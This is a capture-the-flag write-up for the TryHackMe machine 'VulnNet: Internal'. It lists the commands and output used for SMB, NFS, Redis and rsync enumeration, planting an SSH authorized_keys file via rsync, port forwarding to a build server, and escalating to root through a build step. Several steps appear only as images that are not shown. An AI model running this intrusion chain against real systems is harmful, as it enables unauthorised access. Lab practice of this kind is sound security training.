# VulnNet: Internal 4:36-5:51 6:07-6:23 6:41-6:48 7:29-7:51 8:49-9:03

This is a write-up for the machine VulnNet: Internal located at: [https://tryhackme.com/room/vulnnetinternal](https://tryhackme.com/room/vulnnetinternal)

I ran an nmap scan

```c
nmap -T4 -A 10.10.98.192 -oN nmap_output.txt
```

This is the output I got:

```c
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 17:37 EDT
Nmap scan report for 10.10.98.192
Host is up (0.20s latency).
Not shown: 993 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34713/tcp   mountd
|   100005  1,2,3      45887/tcp6  mountd
|   100005  1,2,3      46635/udp6  mountd
|   100005  1,2,3      55619/udp   mountd
|   100021  1,3,4      43989/tcp6  nlockmgr
|   100021  1,3,4      46185/tcp   nlockmgr
|   100021  1,3,4      55225/udp   nlockmgr
|   100021  1,3,4      55609/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-09-23T23:38:16+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-23T21:38:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.51 seconds
```

I then ran **smbmap -H &lt;IP&gt;**, and got the following output:

```c
[+] Guest session       IP: 10.10.98.192:445    Name: 10.10.98.192                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shares                                                  READ ONLY       VulnNet Business Shares
        IPC$                                                    NO ACCESS       IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

I then ran **smbclient \\\\10.10.98.192\\shares**, and got the following output:

```c
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3278156 blocks available
```

In the **temp** folder, there was the following file:

```c
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021
```

In the **data** folder, there was the following file:

```c
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021
```

Looking through the files, I found the flag for the services.txt:

![](../../.gitbook/assets/image%20%28207%29.png)

I then ran a **metasploit** module **auxiliary/scanner/rsync/modules\_list**. This is what I got from the result from it:

![](../../.gitbook/assets/image%20%28215%29.png)

I then read [this write-up](https://cyberrat.medium.com/vulnnet-internal-tryhackeme-cad6ccb9ad54) and realized that I did not use the **showmount** command. I then followed the write-up to run  **showmeant -e &lt;IP&gt;**. I then got the following:

![](../../.gitbook/assets/image%20%28211%29.png)

I then mounted the system to my machine:

![](../../.gitbook/assets/image%20%28214%29.png)

Viewing through the files I came across some sort of password in the redis.conf file:

![](../../.gitbook/assets/image%20%28206%29.png)

I then followed the same write-up to understand my next step. This was to use **redis-cli** in order to connect to the database and see what is there using the pasword we found earlier. I ran **redis-cli -h 10.10.98.192 -a &lt;requirepass\_from\_earlier&gt;** in order to login to the database. I then was able to find the flag for internal:

![](../../.gitbook/assets/image%20%28205%29.png)

When I ran **LRANGE authlist 1 20**, I got the following:

![](../../.gitbook/assets/image%20%28199%29.png)

The three values were the exact same, and seemed to be base64 encoded. I decoded it online and got the following:

![](../../.gitbook/assets/image%20%28212%29.png)

So now we have to connect to rsync with this password:

![](../../.gitbook/assets/image%20%28202%29.png)

There is a sys-internal directory that I ave to find a way to get access into. I followed the aforementioned write-up and ran the following commands \(tweaked to work for me\):

```c
mkdir local_storage
rsync -av rsync://rsync-connect@10.10.98.192/files local_storage
```

This allowed me to download the folder to my local drive. In that directory, I found the user.txt file:

![](../../.gitbook/assets/image%20%28201%29.png)

I got stuck here, so I had to view the write-up again. I was meant to create an SSH keypair and upload it using rsync. So I ran the following commands:

```c
ssh-keygen -t rsa 
cat internals.pub | tee authorized_keys && chmod 600 authorized_keys
rsync -av authorized_keys rsync://rsync-connect@10.10.98.192/files/sys-internal/.ssh  
```

For the previous step, I ended up getting stuck, and found [this write-up](https://muzec0318.github.io/posts/vulnet.html) that actually clarified the situation for me. This same write-up led me to run **ss** **-tulpn** to find out what ports were open. I used the same write-up to figure out we have to do port forwarding. In order to do this, I ran the following command:

```c
ssh -i internals -L 8111:localhost:8111 sys-internal@10.10.98.192 
```

Visiting `localhost:8111` led me to the following page:

![](../../.gitbook/assets/image%20%28204%29.png)

I then searched for the word **token** in the whole filesystem to find a token for the following webpage:

![](../../.gitbook/assets/image%20%28210%29.png)

The second to last authentication token worked for me! I then created a new project:

![](../../.gitbook/assets/image%20%28213%29.png)

I then created a build config:

![](../../.gitbook/assets/image%20%28200%29.png)

I then went to Build Steps and followed a bit of [this write-up](https://infosecwriteups.com/tryhackme-writeup-vulnet-internal-9abe74955f32) for this part. I following the following image: 

![](../../.gitbook/assets/image%20%28203%29.png)

I then ran the script from the choice on top, and when I went back to my previous shell, I ran **/bin/bash -p**, and I was able to get root:

![](../../.gitbook/assets/image%20%28209%29.png)

I wan then able to get the root flag:

![](../../.gitbook/assets/image%20%28208%29.png)

